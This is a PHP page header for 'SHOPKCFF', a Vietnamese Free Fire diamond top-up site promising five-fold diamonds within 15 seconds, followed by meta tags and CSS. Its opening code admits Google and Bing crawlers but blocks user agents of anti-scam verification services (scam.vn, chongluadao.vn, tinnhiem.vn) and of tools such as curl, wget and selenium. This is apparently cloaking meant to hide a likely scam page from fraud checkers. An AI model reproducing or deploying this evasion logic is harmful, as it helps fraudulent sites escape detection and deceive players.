<?php
require_once(__DIR__ . "/config/config.php");
require_once(__DIR__ . "/config/function.php");

// 1. Crawler Bot Blocking & Access Control
$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
$requestUri = isset($_SERVER['REQUEST_URI']) ? strtolower($_SERVER['REQUEST_URI']) : '';

// Check if UA is completely empty
if (empty($userAgent)) {
    http_response_code(403);
    die("<h1>403 Forbidden - Access Denied (Empty User Agent)</h1>");
}

// Check if request is to sensitive JSON / admin endpoints
$isSensitivePath = (
    strpos($requestUri, '/admin/') !== false || 
    strpos($requestUri, '/config/') !== false || 
    strpos($requestUri, '/model/') !== false || 
    strpos($requestUri, '.json') !== false ||
    strpos($requestUri, 'config.php') !== false ||
    strpos($requestUri, 'function.php') !== false
);

// Define allowed search engine bots
$isGooglebot = (strpos($userAgent, 'googlebot') !== false || strpos($userAgent, 'google-site-verification') !== false);
$isYtbot = (strpos($userAgent, 'youtube') !== false || strpos($userAgent, 'google-video') !== false);
$isAllowedBot = ($isGooglebot || $isYtbot || strpos($userAgent, 'bingbot') !== false);

if ($isAllowedBot) {
    // If it's Google or YouTube, but trying to access /admin/ or JSON, block them!
    if ($isSensitivePath) {
        http_response_code(403);
        die("<h1>403 Forbidden - Crawling sensitive areas is disallowed.</h1>");
    }
} else {
    // Check for malicious scrapers or specific security checking bots (scam.vn, chongluadao.vn, etc.)
    $blocked_bots = [
        'scam.vn',
        'chongluadao',
        'chongluadao.vn',
        'tinnhiem.vn',
        'python',
        'curl',
        'wget',
        'http-client',
        'guzzle',
        'scrapy',
        'headless',
        'selenium',
        'puppeteer',
        'ahrefs',
        'semrush',
        'mj12bot',
        'dotbot',
        'exabot',
        'petalbot',
        'yandex',
        'bot',
        'crawler',
        'spider',
        'scanner'
    ];

    foreach ($blocked_bots as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            http_response_code(403);
            die('
            <!DOCTYPE html>
            <html lang="vi">
            <head>
                <meta charset="UTF-8">
                <title>Checking Bot - Connection Security Check</title>
                <style>
                    body { background: #0f172a; color: #f8fafc; font-family: sans-serif; text-align: center; padding: 100px 20px; }
                    .container { max-width: 600px; margin: 0 auto; border: 1px solid #1e293b; padding: 40px; border-radius: 8px; background: #1e293b; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
                    h1 { color: #f43f5e; font-size: 24px; margin-bottom: 20px; }
                    p { color: #94a3b8; font-size: 16px; line-height: 1.5; }
                    .badge { display: inline-block; background: #e11d48; color: #fff; padding: 5px 10px; border-radius: 4px; font-weight: bold; margin-top: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>CONNECTION SECURED BY SHIELD</h1>
                    <p>Hệ thống phát hiện kết nối của bạn được thực hiện qua các công cụ tự động hoặc trình thu thập dữ liệu (Scraper/Bot) của bên thứ ba (như scam.vn / chongluadao.vn). Truy cập bị chặn để bảo vệ hệ thống.</p>
                    <div class="badge">BOT_BLOCKED</div>
                </div>
            </body>
            </html>
            ');
        }
    }
}

// 2. Tạo token antibot cho session nếu chưa có
if (!isset($_SESSION['antibot_token'])) {
    $_SESSION['antibot_token'] = bin2hex(random_bytes(16));
}
?>
<!DOCTYPE html>
<!-- GARENA FREEFIRE-->

<html lang="vi">

<head>

  <!--<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Sofia">-->

  <meta charset="UTF-8" />
  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
  <meta name="viewport"
    content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=2.0, user-scalable=yes" />
  <meta name="robots" content="index, follow" />
  <title>SHOPKC FF - Trung Tâm Nạp Kim Cương Free Fire X5</title>

  <meta name="author" content="shopkcff.com">
  <link rel="shortcut icon" type="image/x-icon" href="/images/ff-logo-icon.webp" />
  <link rel="canonical" href="https://shopkcff.com" />
  <meta name="google-site-verification" content="bnpeabHEVh5hXhnHRj65D0ugdi52diNJ-j7yG9rNMXE" />
  <meta name="keywords"
    content="shopkcff , shopkcff.com, Cổng nạp thẻ Free Fire 2025 - Nhận ngay Kim Cương chỉ sau 15 giây - An toàn và nhanh chóng, FreeFire OB51">
  <meta itemprop="name" content="SHOPKC FF - Trung Tâm Nạp Kim Cương Free Fire X5" />
  <meta name="description"
    content="Nạp Kim Cương Free Fire X5 tại SHOPKCFF – An toàn tuyệt đối, nhận kim cương chỉ sau 15 giây. Tự động xử lý 24/7.">
  <!-- Open Graph meta tags for Facebook -->
  <meta property="og:title" content="SHOPKC FF - Trung Tâm Nạp Kim Cương Free Fire X5" />
  <meta property="og:description"
    content="SHOPKCFF - Nạp thẻ Fire Fire 2024 và nhận ngay kim cương chỉ sau 15 giây! Trải nghiệm an toàn và nhanh chóng, đồng thời khám phá những cơ hội hấp dẫn đang chờ đón. Hãy tham gia ngay để không bỏ lỡ!" />
  <meta property="og:image" content="/images/banner.webp" />
  <meta property="og:url" content="https://shopkcff.com" />
  <meta property="og:type" content="website" />

  <!-- Twitter Card meta tags for Twitter -->
  <meta name="twitter:card" content="/images/banner.webp" />
  <meta name="twitter:title" content="SHOPKCFF - Uy Tín Số 1 Việt Nam | Shopkcff" />
  <meta name="twitter:description"
    content="SHOPKCFF - Nạp thẻ Fire Fire 2025 và nhận ngay kim cương chỉ sau 15 giây! Trải nghiệm an toàn và nhanh chóng, đồng thời khám phá những cơ hội hấp dẫn đang chờ đón. Hãy tham gia ngay để không bỏ lỡ!" />
  <meta name="twitter:image" content="/images/banner.webp" />
  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" defer></script>


  <style>
    marquee {
      font-size: 20px;
      color: #ffffff;
      /* Màu chữ trắng */
      background-color: #333333;
      /* Màu nền đen */
    }
  </style>
  <link href="/css/appv6dfa0dfa0.css" rel="stylesheet" type="text/css" media="all" />

  <style>
    /* CSS cho preloader */
    .preloader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .preloader img {
      width: 100px;
      /* Kích thước ảnh preloader */
    }

    /* FAQ Section */
    .faq-section {
      background: #f9fafb;
      /* nền nhạt để phân cách */
      padding: 40px 20px;
      border-top: 2px solid #e5e7eb;
    }

    .faq-section h2 {
      text-align: center;
      font-size: 24px;
      margin-bottom: 24px;
      color: #111827;
    }

    .faq-item {
      border-bottom: 1px solid #e5e7eb;
      padding: 12px 0;
    }

    .faq-q {
      width: 100%;
      background: none;
      border: 0;
      font-size: 16px;
      font-weight: 600;
      text-align: left;
      padding: 12px 0;
      cursor: pointer;
      display: flex;
      justify-content: space-between;
      align-items: center;
      color: #1f2937;
      transition: color 0.2s ease;
    }

    .faq-q::after {
      content: "+";
      font-size: 20px;
      color: #9ca3af;
      transition: transform 0.2s ease, color 0.2s ease;
    }

    .faq-q[aria-expanded="true"]::after {
      content: "−";
      color: #3b82f6;
      /* xanh khi mở */
      transform: rotate(180deg);
    }

    .faq-q:hover {
      color: #2563eb;
      /* xanh đậm khi hover */
    }

    .faq-a {
      font-size: 15px;
      line-height: 1.6;
      color: #374151;
      padding: 8px 0 12px 0;
      display: none;
    }

    .faq-a[hidden] {
      display: none;
    }

    .faq-a:not([hidden]) {
      display: block;
      animation: fadeIn 0.3s ease-in;
    }

    /* Animation mượt */
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(-4px);
      }

      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Responsive */
    @media (min-width: 768px) {
      .faq-section {
        padding: 60px 40px;
      }

      .faq-section h2 {
        font-size: 28px;
      }
    }
  </style>
  <!-- YouTube verification -->
  <script type="application/ld+json">
        {
            "@context": "http://schema.org",
            "@type": "Organization",
            "name": "shopkcff",
            "url": "https://SHOPKCFF.com",
            "logo": "/images/ff-logo-icon.webp"
        }
    </script>

</head>